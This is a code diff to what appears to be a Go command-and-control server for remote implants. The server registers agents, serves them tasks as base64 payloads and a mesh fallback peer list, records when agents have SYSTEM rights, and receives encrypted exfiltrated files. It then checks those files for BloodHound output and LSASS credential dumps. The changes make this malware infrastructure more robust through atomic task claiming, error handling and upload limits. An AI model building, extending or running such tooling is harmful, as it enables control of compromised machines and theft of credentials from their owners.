@@ -130,8 +130,8 @@ func (s *Server) handleRegister(w http.ResponseWriter, r *http.Request) {
 	}
 
 	ip := r.RemoteAddr
-	if idx := strings.LastIndex(ip, ":"); idx != -1 {
-		ip = ip[:idx]
+	if host, _, splitErr := net.SplitHostPort(ip); splitErr == nil {
+		ip = host
 	}
 	if req.IPOverride != "" {
 		parsed := net.ParseIP(req.IPOverride)
@@ -231,7 +231,11 @@ func (s *Server) handleBeacon(w http.ResponseWriter, r *http.Request) {
 	}
 	s.db.TouchAgent(agentID)
 
-	tasks, _ := s.db.PendingTasks(agentID)
+	tasks, err := s.db.ClaimPendingTasks(agentID, 32)
+	if err != nil {
+		http.Error(w, "task query error", http.StatusInternalServerError)
+		return
+	}
 
 	wires := make([]taskWire, 0) // non-nil so JSON encodes as [] not null
 	for _, t := range tasks {
@@ -240,7 +244,6 @@ func (s *Server) handleBeacon(w http.ResponseWriter, r *http.Request) {
 			tw.Payload = base64.StdEncoding.EncodeToString(t.Payload)
 		}
 		wires = append(wires, tw)
-		s.db.MarkTaskFetched(t.ID)
 	}
 
 	// Always include mesh peer list so agents keep a fresh fallback even when idle.
@@ -302,7 +305,10 @@ func (s *Server) handleResult(w http.ResponseWriter, r *http.Request) {
 		http.Error(w, "bad json", http.StatusBadRequest)
 		return
 	}
-	s.db.InsertResult(req.TaskID, agentID, req.Output, req.Error)
+	if err := s.db.InsertResult(req.TaskID, agentID, req.Output, req.Error); err != nil {
+		http.Error(w, "result rejected", http.StatusBadRequest)
+		return
+	}
 	if req.IsAdmin {
 		s.db.UpdateAgentAdmin(agentID, true)
 		s.db.UpdateAgentUsername(agentID, "nt authority\\system")
@@ -333,6 +339,10 @@ func (s *Server) handleUpload(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 	agentID, filename := parts[0], filepath.Base(parts[1])
+	if filename == "" || filename == "." {
+		http.Error(w, "invalid filename", http.StatusBadRequest)
+		return
+	}
 
 	agent, err := s.db.GetAgent(agentID)
 	if err != nil {
@@ -340,17 +350,28 @@ func (s *Server) handleUpload(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	body, _ := io.ReadAll(io.LimitReader(r.Body, 512*1024*1024))
+	r.Body = http.MaxBytesReader(w, r.Body, 512*1024*1024)
+	body, err := io.ReadAll(r.Body)
+	if err != nil {
+		http.Error(w, "body too large or unreadable", http.StatusRequestEntityTooLarge)
+		return
+	}
 	plaintext, err := Open(agent.AESKey, body)
 	if err != nil {
 		http.Error(w, "decrypt error", http.StatusBadRequest)
 		return
 	}
 
-	dir := filepath.Join("data", "uploads", agentID)
-	os.MkdirAll(dir, 0700)
+	dir := filepath.Join(s.cfg.DataDir, "uploads", agentID)
+	if err := os.MkdirAll(dir, 0700); err != nil {
+		http.Error(w, "upload directory error", http.StatusInternalServerError)
+		return
+	}
 	path := filepath.Join(dir, filename)
-	os.WriteFile(path, plaintext, 0600)
+	if err := os.WriteFile(path, plaintext, 0600); err != nil {
+		http.Error(w, "upload write error", http.StatusInternalServerError)
+		return
+	}
 	s.printf("[%s] uploaded file: %s (%d bytes)\n", agentID[:8], filename, len(plaintext))
 	go s.CheckAndPromptBH(agentID, filename, plaintext)
 	go s.CheckAndPromptLSASS(agentID, filename)
